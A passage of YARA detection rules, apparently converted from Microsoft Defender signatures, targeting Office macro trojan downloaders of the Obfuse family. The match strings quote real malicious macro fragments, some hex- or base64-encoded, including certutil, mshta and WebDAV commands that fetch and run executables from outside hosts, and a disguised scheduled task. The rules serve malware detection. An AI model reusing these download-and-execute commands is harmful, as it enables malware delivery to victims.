        $x_1_3 = {6f 6e 63 65 61 79 65 61 72 70 65 73 74 63 6f 6e 74 72 6f 6c 2e 63 [0-5] 6f 6d 2f [0-32] 2f 31 31 2e 70 [0-5] 6e 67 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKXA_2147814166_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKXA!MTB"
        threat_id = "2147814166"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 02 00 50 49 44 20 3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 39 34 38 35 37 38 38 32 33 39 38 33 37 32 36 37 32 36 2f 39 34 38 37 32 31 33 34 38 31 37 30 31 32 31 32 39 36 2f 4c 71 6f 68 70 73 68 6e 64 2e 65 78 65 22 22 20 52 71 6d 6d 63 71 70 6c 75 7a 6c 66 66 75 64 61 78 73 68 69 2e 65 78 65 2e 65 78 65 20 26 26 20 52 71 6d 6d 63 71 70 6c 75 7a 6c 66 66 75 64 61 78 73 68 69 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKJA_2147814430_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKJA!MTB"
        threat_id = "2147814430"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 62 76 2e [0-5] 2f 63 65 73 2f 74 65 6e 2e 73 6e 64 2d 63 69 6d 61 6e 79 64 2e 6f 67 6e 6f 6d 70 75 78 2f 2f 3a}  //weight: 1, accuracy: Low
        $x_1_2 = {73 74 61 72 74 2d 70 72 6f 63 65 73 73 28 24 65 6e 76 3a 74 65 6d 70 2b 20 27 5c [0-10] 2e 76 62 73}  //weight: 1, accuracy: Low
        $x_1_3 = "ErrorActionPreference = 'SilentlyContinue" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRA_2147814628_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRA!MTB"
        threat_id = "2147814628"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pPth = CurDir & \"\\knla.dat\"" ascii //weight: 1
        $x_1_2 = "Set ws = CreateObject(\"WS\" & \"crip\" & \"t.Sh\" & \"ell\")" ascii //weight: 1
        $x_1_3 = "Set wpe = ws.Environment(\"Pro\" & \"ce\" & \"ss\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BBA_2147815121_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BBA!MTB"
        threat_id = "2147815121"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dgt.InstallProduct \"https://cvg.org/wp-content/uploads/2020/document.zip" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ALA_2147815487_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ALA!MTB"
        threat_id = "2147815487"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "23acefinoprstuxybcdeilopsuy" ascii //weight: 1
        $x_1_2 = "chr50chr48chr48dimwshshellasobjectdimspecialpathasstringsetwshshellcreateobjectwscriptshellspecialpath" ascii //weight: 1
        $x_1_3 = "ifstatus200thensetcreateobjectadodbstreamopentypewritesavetofilecloseendifopenendsub" ascii //weight: 1
        $x_1_4 = "createobjectshellapplicationspecialpathgzwfhopengethwww" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDG_2147816503_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDG!MTB"
        threat_id = "2147816503"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(48)+chr(48)+chr(50)" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = "specialpath=wshshell.specialfolders(\"appdata\")" ascii //weight: 1
        $x_1_4 = "=specialpath+(\"\\qj.\").open\"get\",(\"h://www.kmlk.m//vdhgggkjzbkgjkjzgk/vhvgwvgqdg." ascii //weight: 1
        $x_1_5 = "=1range(\"ah1\").value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKSD_2147816536_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKSD!MTB"
        threat_id = "2147816536"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "S8vOnB0dGgnJyhlbGlGZGEnOyRUQz0kYzMsJGI0ZGYsJHdlMjIgLUpvaW4gJyc7SUVYKChbcmVnZXhdOjpNYXRjaGVzKCRUQywnLicsJ1" ascii //weight: 1
        $x_1_2 = "JpZ2h0VG9MZWZ0JykgfCBGb3JFYWNoIHskXy52YWx1ZX0pIC1qb2luICcnKTtzdGFydC1wcm9jZXNzKCRlbnY6dGVtcCsgJ1" ascii //weight: 1
        $x_1_3 = "xibGVzc3MudmJzJyk7cmVtb3ZlLWl0ZW0gKCRlbnY6YXBwZGF0YSArICdcWUpvQ3MuYmF0Jyk" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDRR_2147816571_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDRR!MTB"
        threat_id = "2147816571"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GetObject(T8qceb0X(\"yNg4pV3vmQZ\")).Environment(T8qceb0X(\"NlBVUbaQ\")).Remove (T8qceb0X(\"lVOf6nuJIn\"))" ascii //weight: 1
        $x_1_2 = "GetObject(IHZm_3LYDJGE(\"Ovsvujx6mXSE\")).Environment(IHZm_3LYDJGE(\"GhUVaDeU\")).Remove (IHZm_3LYDJGE(\"G53smKPbN\"))" ascii //weight: 1
        $x_1_3 = "= StrReverse(ActiveDocument.CustomDocumentProperties(strInput))" ascii //weight: 1
        $x_1_4 = "= Timer() + (Finish)" ascii //weight: 1
        $x_1_5 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 [0-15] 28 22 [0-32] 22 29 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_6 = {73 68 65 6c 6c 43 6f 64 65 2c 20 [0-64] 2c 20 36 34 2c 20 56 61 72 50 74 72 28 [0-64] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAS_2147816720_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAS!MTB"
        threat_id = "2147816720"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = "GetObject(Qeerere(\"138124129128122128135134077\")).Get(Qeerere(\"106124129070069114099133130118120134134\")).Create" ascii //weight: 5
        $x_5_2 = "GetObject(Nuts(\"203213210209219209200207134\")).Get(Nuts(\"235213210143142227236206211223217207207\")).Create" ascii //weight: 5
        $x_5_3 = "= Chr(Boomon - 19)" ascii //weight: 5
        $x_5_4 = "= Chr(Beets Xor 188)" ascii //weight: 5
        $x_1_5 = {57 68 69 6c 65 20 4c 65 6e 28 [0-10] 29 20 3e 20 30}  //weight: 1, accuracy: Low
        $x_1_6 = {44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 4d 79 4d 61 63 72 6f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 2 of ($x_1_*))) or
            ((3 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PKSW_2147816953_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKSW!MTB"
        threat_id = "2147816953"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= SCQU.Open(v0df + \"\\cPxNX.bat\")" ascii //weight: 1
        $x_1_2 = " Environ(\"AppData\")" ascii //weight: 1
        $x_1_3 = {20 3d 20 47 65 74 4f 62 6a 65 63 74 28 52 61 6e 67 65 28 22 [0-5] 22 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = "() + \"\\cPxNX.bat\" 'you can specify here the text file name you want to create" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAU_2147816957_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAU!MTB"
        threat_id = "2147816957"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(TnV0cw(\"136122127126120126133132075\")).Get(TnV0cw(\"104122127068067112097131128116118132132\")).Create" ascii //weight: 1
        $x_1_2 = "Loop While Len(TWlsaw) > 0" ascii //weight: 1
        $x_1_3 = "Chr(QmVldHM - 17)" ascii //weight: 1
        $x_1_4 = {44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 4d 79 4d 61 63 72 6f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BKA_2147817055_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BKA!MTB"
        threat_id = "2147817055"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"C:\\Windows\\System32\\findstr.exe /V /L W3AllLov3LolBas \\\\20.69.97.31\\webdav\\um.exe > C:\\Windows\\Temp\\um.exe && exit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAV_2147817117_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAV!MTB"
        threat_id = "2147817117"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(Range(\"A106\").Value)" ascii //weight: 1
        $x_1_2 = "SYqP.Open(v0df + \"\\HvTBf.bat\")" ascii //weight: 1
        $x_1_3 = "Open GTZoMg For Output As #1" ascii //weight: 1
        $x_1_4 = "Range(\"A103\").Value + \" -\" + Range(\"A100\").Value" ascii //weight: 1
        $x_1_5 = "qIrm = Environ(\"AppData\")" ascii //weight: 1
        $x_1_6 = "Sub Workbook_Activate()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAW_2147817178_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAW!MTB"
        threat_id = "2147817178"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(Range(\"A106\").Value)" ascii //weight: 1
        $x_1_2 = "JxEw.Open(v0df + \"\\Sanek.bat\")" ascii //weight: 1
        $x_1_3 = "Open KqlKqW For Output As #1" ascii //weight: 1
        $x_1_4 = "Range(\"A103\").Value + \" -\" + Range(\"A100\").Value" ascii //weight: 1
        $x_1_5 = "yrQS = Environ(\"AppData\")" ascii //weight: 1
        $x_1_6 = "Sub Workbook_Activate()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SSMK_2147817187_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SSMK!MTB"
        threat_id = "2147817187"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".DataType = kipftrrwxnypnzf(\"62696e2e68\") & kipftrrwxnypnzf(\"6578\")" ascii //weight: 1
        $x_1_2 = "entry_class = kipftrrwxnypnzf(\"4d65\") & kipftrrwxnypnzf(\"746572507265746572\")" ascii //weight: 1
        $x_1_3 = "& kipftrrwxnypnzf(\"6d6174746572\"))" ascii //weight: 1
        $x_1_4 = {2e 44 61 74 61 54 79 70 65 20 3d 20 [0-37] 28 22 36 32 36 39 36 65 32 65 36 38 22 29 20 26 20 [0-37] 28 22 36 35 37 38 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAZ_2147817772_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAZ!MTB"
        threat_id = "2147817772"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GetObject(Range(\"B106\").Value)" ascii //weight: 1
        $x_1_2 = {62 64 66 64 66 20 3d 20 ?? ?? ?? ?? 2e 4f 70 65 6e 28 76 30 64 66 20 2b 20 22 5c ?? ?? ?? ?? ?? 2e 62 61 74 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "rev(Range(\"B102\").Value) + rev(Range(\"B100\").Value)" ascii //weight: 1
        $x_1_4 = "rev & Mid(s, p, 1)" ascii //weight: 1
        $x_1_5 = "CStr(Environ(\"USERPROFILE\"))" ascii //weight: 1
        $x_1_6 = {4f 70 65 6e 20 ?? ?? ?? ?? ?? ?? 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SSMT_2147817972_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SSMT!MTB"
        threat_id = "2147817972"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "myFile = \"C:\\Users\\Public\\update.js" ascii //weight: 1
        $x_1_2 = {44 65 62 75 67 2e 41 73 73 65 72 74 20 56 42 41 2e 53 68 65 6c 6c 28 61 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = "= Worksheets(\"shit\").Range(\"K335\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BENC_2147817994_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BENC!MTB"
        threat_id = "2147817994"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c c\" + \"md /\" + \"c msht\" + \"a.e\" + \"xe http://leehr36.mypressonline.com/h.php\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BKAQ_2147818573_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BKAQ!MTB"
        threat_id = "2147818573"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ofp = ndp & \"update.exe\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(kk & ll & \"d\" & mm & \"vice\")" ascii //weight: 1
        $x_1_3 = "Call oo.RegisterTask(\"MicrosoftUpdate\", xt, 6, , , 3)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BBKO_2147819033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BBKO!MTB"
        threat_id = "2147819033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= NAMEME.kqWZZ().ShellExecute(KNOZ(), XUNKv(), Null, Null, 0)" ascii //weight: 1
        $x_1_2 = "WSNh5 = .Shapes(1).TextFrame.Characters.Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BBQ_2147819046_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BBQ!MTB"
        threat_id = "2147819046"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= DDD(\"aHR0cDovL2Fqb2Eub3JnL2hvbWUvZXJyb3IvdG1wL1ZWLnRtcA==\")" ascii //weight: 1
        $x_1_2 = "= DDD(\"QzpcVXNlcnNc\") + Application.UserName + DDD(\"XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcV0hlYWx0aFNjYW5uZXIuZXhl\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SNS_2147819062_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SNS!MTB"
        threat_id = "2147819062"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Auto_Close()" ascii //weight: 1
        $x_1_2 = "= GetObject(kULLIlullikhao)" ascii //weight: 1
        $x_1_3 = ".copyfile lorakala, wingadumleviosa, True" ascii //weight: 1
        $x_1_4 = "= \"C:\\\\ProgramData\\\\ddond.com https://taxfile.mediafire.com/\" + \"file/87j3bj0ks0asu58/3.htm/file\"" ascii //weight: 1
        $x_1_5 = "Call VBA.Shell#(kalimuth)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKSX_2147819472_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKSX!MTB"
        threat_id = "2147819472"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 6f 6d 2f 66 69 6c 65 2f 70 33 61 79 34 69 74 30 38 6a 31 73 37 68 70 2f 30 6d 61 69 6e 2e 68 74 6d 2f 66 69 6c 65 60 00 68 74 74 70 73 3a 2f 2f 74 61 78 66 69 6c 65 2e 6d 65 64 69 61 66 69 72 65 2e}  //weight: 1, accuracy: Low
        $x_1_2 = "','winmgmts:','" ascii //weight: 1
        $x_1_3 = "C:\\x5cProgramData\\x5cddond.com" ascii //weight: 1
        $x_1_4 = "= \"C:\\Users\\Public\\update.js\"" ascii //weight: 1
        $x_1_5 = "','Win32_ProcessStartup','" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBA_2147819899_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBA!MTB"
        threat_id = "2147819899"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KNwS().Exec \"Powe\" + gm2 + gm3 + gm4" ascii //weight: 1
        $x_1_2 = "xOut & VBA.Mid(xValue, i, 1)" ascii //weight: 1
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 68 68 67 74 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
        $x_1_4 = "UserForm1.iqXGpP(g1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBB_2147820197_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBB!MTB"
        threat_id = "2147820197"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "NAMEME.JPVuz().ShellExecute(lESH(), wPDLo(), Null, Null, 0)" ascii //weight: 1
        $x_1_2 = "= GetObject(GcdzuH())" ascii //weight: 1
        $x_1_3 = ".Shapes(1).TextFrame.Characters.Text" ascii //weight: 1
        $x_1_4 = "wPDLo = (\"ping google.com;\" + Istz5)" ascii //weight: 1
        $x_1_5 = {28 22 70 22 20 2b 20 49 73 74 7a 36 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBC_2147822352_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBC!MTB"
        threat_id = "2147822352"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "16"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 [0-25] 28 22 [0-25] 22 29 29 2e 56 61 6c 75 65}  //weight: 3, accuracy: Low
        $x_3_2 = {4d 69 64 28 [0-40] 2c 20 [0-40] 20 2b 20 31 2c 20 31 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 3, accuracy: Low
        $x_3_3 = {47 65 74 4f 62 6a 65 63 74 28 [0-25] 28 22 [0-25] 22 29 29}  //weight: 3, accuracy: Low
        $x_3_4 = "StrReverse(ActiveDocument.CustomDocumentProperties(strInput))" ascii //weight: 3
        $x_1_5 = "= Timer() + (Finish)" ascii //weight: 1
        $x_1_6 = {3d 20 54 69 6d 65 72 28 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
        $x_3_7 = "Sub Document_Open()" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
